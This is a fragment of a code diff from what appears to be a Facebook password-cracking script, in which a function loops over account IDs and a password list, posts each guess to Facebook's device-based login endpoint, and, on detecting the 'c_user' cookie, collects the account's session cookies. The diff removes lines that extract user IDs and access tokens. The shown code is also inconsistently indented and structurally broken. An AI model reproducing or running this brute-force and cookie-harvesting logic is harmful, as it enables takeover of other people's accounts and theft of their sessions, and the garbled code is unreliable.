@@ -947,14 +947,6 @@ def ffb(ids,names,passlist):
 			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
 			AXI=session.cookies.get_dict().keys()
 			if "c_user" in AXI:
-				try:
-                        used=str(q['uid'])
-                        tokic=str(q['access_token'])
-                    except:
-                        used=user
-                        tokic='lol'
-                    if used in ok or used in tl:
-                        break
                     coki = []
                     for x in q['session_cookies']:
                         coki.append(x['name']+'='+x['value']+';')
